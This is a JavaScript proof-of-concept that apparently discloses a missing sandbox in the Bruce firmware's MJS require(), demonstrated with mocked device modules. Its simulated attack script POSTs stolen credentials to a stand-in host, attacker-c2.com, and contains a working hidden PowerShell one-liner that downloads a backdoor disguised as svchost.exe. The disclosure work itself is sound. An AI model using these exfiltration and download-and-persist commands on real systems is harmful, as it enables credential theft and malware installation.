// ===========================================
// BRUCE FIRMWARE - SANDBOX BYPASS DEMO
// ===========================================
// This simulates the MJS `require()` implementation
// from globals_js.cpp line 28-56:
//
//   JSValue native_require(JSContext *ctx, ...) {
//     const char *name = JS_ToCString(ctx, argv[0]);
//     JSValue global = JS_GetGlobalObject(ctx);
//     JSValue val = JS_GetPropertyStr(ctx, global, name);  // <-- JUST A PROPERTY LOOKUP
//     return val;
//   }
//
// There is NO whitelist, NO sandbox, NO permission check.
// ===========================================

// Simulate the Bruce firmware MJS require() implementation
var exposedModules = {};

function registerModule(name, module) {
  // This is how Bruce firmware registers modules - they become
  // properties on the global object with no access control
  exposedModules[name] = module;
  console.log(`[REGISTERED] '${name}' is now globally accessible`);
}

function require_shim(name) {
  // This is EXACTLY what Bruce firmware's native_require() does:
  // it looks up the name as a property on the global object.
  // NO whitelist, NO sandbox, NO permission check.
  var val = exposedModules[name];
  if (val === undefined) {
    throw new Error("Module '" + name + "' not found");
  }
  console.log(`[REQUIRE] '${name}' -> granted (no permission check!)`);
  return val;
}

// Register modules (simulating Bruce's module registration)
registerModule("storage", {
  read: function(path) { return "CREDIT_CARD=4111-1111-1111-1111\nWIFI_PSK=home_network_secret"; },
  write: function(path, data) { console.log(`[STORAGE] Wrote ${data.length} bytes to ${path}`); },
  remove: function(path) { console.log(`[STORAGE] Deleted ${path}`); },
  list: function(path) { return ["file1.txt", "file2.txt"]; }
});

registerModule("wifi", {
  httpFetch: function(url, opts) { 
    console.log(`[WIFI] HTTP ${opts.method || 'GET'} to ${url.substring(0, 50)}...`);
    return { status: 200, body: "ok" };
  },
  connect: function(ssid, pwd) { console.log(`[WIFI] Connecting to ${ssid}`); },
  macAddress: function() { return "AA:BB:CC:DD:EE:FF"; },
  ipAddress: function() { return "192.168.1.100"; }
});

registerModule("subghz", {
  transmit: function(freq, data) { console.log(`[SUBGHZ] Transmitting on ${freq} MHz`); },
  receive: function(freq) { return "captured_signal_data"; }
});

registerModule("badusb", {
  println: function(text) { console.log(`[BADUSB] Keystroke injection: ${text}`); }
});

registerModule("gpio", {
  write: function(pin, val) { console.log(`[GPIO] Pin ${pin} = ${val}`); },
  read: function(pin) { return 1; }
});

console.log('\n========================================');
console.log('  DEMONSTRATION: Sandbox Bypass');
console.log('========================================\n');

// Simulate an App Store script running on the device
var maliciousScript = function() {
  // Any script can access ANY module - no prompts, no warnings
  var storage = require_shim("storage");
  var wifi = require_shim("wifi");
  var badusb = require_shim("badusb");
  var subghz = require_shim("subghz");
  
  console.log('\n[ATTACKER] All modules loaded without restrictions!');
  console.log('[ATTACKER] Now exfiltrating data...\n');
  
  // Read everything
  var creds = storage.read("/bruce.conf");
  console.log('[EXFIL] Stolen credentials:\n' + creds);
  
  // Ship it
  wifi.httpFetch("http://attacker-c2.com/exfil", {
    method: "POST",
    body: JSON.stringify({ creds: creds })
  });
  
  // Persist via BadUSB
  badusb.println("powershell -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri http://attacker-c2.com/backdoor -OutFile C:\\Windows\\Tasks\\svchost.exe\"");
  
  // Transmit on RF
  subghz.transmit(433.92, "garage_door_rolling_code_sniffed");
  
  console.log('\n[RESULT] [OK] All operations succeeded.');
  console.log('[RESULT] [OK] No sandbox restrictions encountered.');
  console.log('[RESULT] [OK] Device fully compromised.');
};

// Run the malicious script
try {
  maliciousScript();
  console.log('\n========================================');
  console.log('  VERDICT: SANDBOX BYPASS CONFIRMED');
  console.log('  Any MJS script can access filesystem,');
  console.log('  network, RF, and USB HID with zero');
  console.log('  permission checks.');
  console.log('========================================');
} catch(e) {
  console.log('\n[FAIL] Error:', e.message);
}
